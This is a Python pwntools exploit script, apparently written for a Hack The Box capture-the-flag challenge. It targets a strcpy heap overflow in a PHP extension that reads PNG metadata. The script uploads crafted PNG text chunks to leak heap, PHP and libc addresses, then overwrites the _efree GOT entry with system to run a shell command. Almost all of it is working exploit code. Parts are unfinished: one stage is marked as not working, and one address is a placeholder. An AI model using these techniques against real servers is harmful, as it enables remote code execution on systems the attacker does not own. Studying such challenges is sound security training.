#!/usr/bin/env python3

import requests
from pwn import *
from PIL import Image
from PIL.PngImagePlugin import PngInfo

lib = ELF("./metadata_reader.so")

context.binary = lib

URL  = "http://localhost:8000/upload.php"


"""
v17 = *(const char **)&v16[6][v12 + 16]; // This is the metadata value from the PNG
v12 += 56LL;
strcpy(v15, v17); // <--- VULNERABILITY (Heap Overflow)
"""
def main():
    # A good spot to leak the zend:alloc address space is this:
    # 
    # 0x7f7c4de59690:   0x00007f7c4de596c8  0x0000000000000000
    # 0x7f7c4de596a0:   0x0000000000000000  0x0000000000000000
    # 0x7f7c4de596b0:   0x0000000000000000  0x00007f7c4de596e0
    # 0x7f7c4de596c0:   0x0000000000000000  0x00007f7c4de59700
    # 0x7f7c4de596d0:   0x0000000000000000  0x0000000000000000
    # 0x7f7c4de596e0:   0x00007f7c4de59708  0x0000000000000000
    # 0x7f7c4de596f0:   0x0000000000000000  0x0000000000000000
    # 0x7f7c4de59700:   0x00007f7c4de59738  0x00007f7c4de59730
    # 0x7f7c4de59710:   0x0000000000000000  0x0000000000000000
    # 0x7f7c4de59720:   0x0000000000000000  0x0000000000000000
    # 0x7f7c4de59730:   0x00007f7c4de59758  0x00007f7c4de59770
    # 0x7f7c4de59740:   0x0000000000000000  0x0000000000000000
    # 
    # The next_ptrs hit are 0x7f7c4de596c8, 0x7f7c4de59700 and 0x7f7c4de59738.
    # If we overwrite the LSB of next_ptr at 0x7f7c4de59700 we can have two
    # overlapping chunks. Freed chunks have their next_ptr pointing backward
    # like this (we'll refer to it as back_ptr to avoid confusion):
    # 
    # 0x73837ec5a6b0: 0x0000000000000000  0x0000000000000000
    # 0x73837ec5a6c0: 0x0000000000000000  0x4141414141414141
    # 0x73837ec5a6d0: 0x4141414141414141  0x4141414141414141
    # 0x73837ec5a6e0: 0x4141414141414141  0x4141414141414141
    # 0x73837ec5a6f0: 0x4141414141414141  0x4141414141414141
    # 0x73837ec5a700: 0x000073837ec5a6c8  0x0000000000000000
    # 0x73837ec5a710: 0x0000000000000000  0x0000000000000000
    # 0x73837ec5a720: 0x0000000000000000  0x0000000000000000
    # 0x73837ec5a730: 0x0000000000000000  0x000073837ec5a770
    # 
    # So if we make two overlapping chunks for 0x73837ec5a700 we can make the
    # program copy the back_ptr over either Copyright field since the chunk
    # related to the Author is freed before Copyright.
    # 
    # NOTE: `_zend_new_array_` recreates the array (and the next_ptrs) so the
    #       overwrites are not permanent.

    target = PngInfo()

    # We can add more duplicated text and they are saved in the image,
    # but usually programs/applications will consider only the last entry.
    for _ in range(19):
        target.add_text("Title", b"A" * 8)

    target.add_text("Title", b"A" * 0x38)   # Off-by-NULL
    target.add_text("Artist", b"B" * 8)
    target.add_text("Copyright", b"C" * 8)

    img = Image.new("RGB", (10, 10), color="red")
    img.save("leak_zend_alloc.png", pnginfo=target)
    
    # Prepare POST request and send it
    files = {'file': ('leak_zend_alloc.png', open('leak_zend_alloc.png', 'rb'), 'image/png')}
    r = requests.post(URL, files=files)
    
    if b"Copyright: " in r.content:
        leak = r.content.split(b"Copyright: ")[1][:6]
        leak = u64(leak.ljust(8, b"\x00"))
        first_chunk = leak - 0x428
        png_metadata_struct = leak - 0x578

        # Zend's leaks
        log.info(f"zend_alloc: 0x{leak:x}")
        log.info(f"1st chunk of list: 0x{first_chunk:x}")
        log.info(f"png_metadata_struct: 0x{png_metadata_struct:x}")
    else:
        log.error("For some reason the response didn't have the 'Copyright' field!")
        exit(-1)


    input("Press ENTER to leak PHP's PIE")

    target = PngInfo()
    target.add_text("Title", b"A" * 0x38 + p64(png_metadata_struct))
    target.add_text("Artist", b"B" * 8)
    target.add_text("Copyright", p64(first_chunk - 0x78))    # Pointer to zval_ptr_dtor address

    img = Image.new("RGB", (10, 10), color="red")
    img.save("leak_php_pie.png", pnginfo=target)

    files = {'file': ('leak_php_pie.png', open('leak_php_pie.png', 'rb'), 'image/png')}
    r = requests.post(URL, files=files)
    
    if b"Artist: " in r.content:
        zval_ptr_dtor = r.content.split(b"Artist: ")[1][:6]
        zval_ptr_dtor = u64(zval_ptr_dtor.ljust(8, b"\x00"))
        socket_got = zval_ptr_dtor + 0xea37A8

        # PHP's PIE leaks
        log.info(f"zval_ptr_dtor: 0x{zval_ptr_dtor:x}")
        log.info(f"socket@got: 0x{socket_got:x}")
    else:
        log.error("For some reason the response didn't have the 'Artist' field!")
        exit(-1)


    # NOTE: THIS DOESN'T WORK BUT I KEEP IT BECAUSE IT WOULD HAVE BEEN A NICE SOLVE (*sad pwner noises*)
    input("Press ENTER to leak LIBC")

    target = PngInfo()
    target.add_text("Title", b"A" * 0x38 + p64(png_metadata_struct))
    target.add_text("Artist", b"B" * 8)
    target.add_text("Copyright", p64(socket_got))

    img = Image.new("RGB", (10, 10), color="red")
    img.save("leak_libc.png", pnginfo=target)

    files = {'file': ('leak_libc.png', open('leak_libc.png', 'rb'), 'image/png')}
    r = requests.post(URL, files=files)
    
    if b"Artist: " in r.content:
        libc_socket = r.content.split(b"Artist: ")[1][:6]
        libc_socket = u64(libc_socket.ljust(8, b"\x00"))
        libc_system = libc_socket - 0x0abe00
        efree_got = 0xdeadbeef      # TODO: Add here _efree@got address

        # LIBC leaks
        log.info(f"socket: 0x{libc_socket:x}")
        log.info(f"system: 0x{libc_system:x}")
    else:
        log.error("For some reason the response didn't have the 'Artist' field!")
        exit(-1)


    input("Press ENTER to get the Flag")

    payload = f"grep -rh HTB . > flag.txt;".encode("ascii")
    target = PngInfo()

    # Allocate a few chunks to make room for the payload of size > 56B.
    # In this way we should avoid overwriting the next_ptr(s) and segfault.
    target.add_text("Title", p64(first_chunk + 0x188))
    for _ in range(4):
        target.add_text("Title", b"A" * 8)

    # Overwrite the next_ptr to "jump back" to the first allocated chunk.
    target.add_text("Title", b"A" * 0x38 + p64(first_chunk))
    target.add_text("Title", b"A" * 8)      # "Consume" a chunk

    # The payload will search for the string "HTB" inside every file in the current directory
    # and save the found line in the file called "f".
    # Then it will perform a POST request at out webhook by reading the content of "f" at place
    # it inside the body.
    target.add_text("Title", payload)
    target.add_text("Artist", b"B" * 0x38 + p64(efree_got))
    target.add_text("Artist", b"B" * 8)             # "Consume" a chunk
    target.add_text("Copyright", p64(libc_system))

    img = Image.new("RGB", (10, 10), color="red")
    img.save("run_exploit.png", pnginfo=target)

    files = {'file': ('run_exploit.png', open('run_exploit.png', 'rb'), 'image/png')}
    r = requests.post(URL, files=files)


if __name__ == "__main__":
    main()
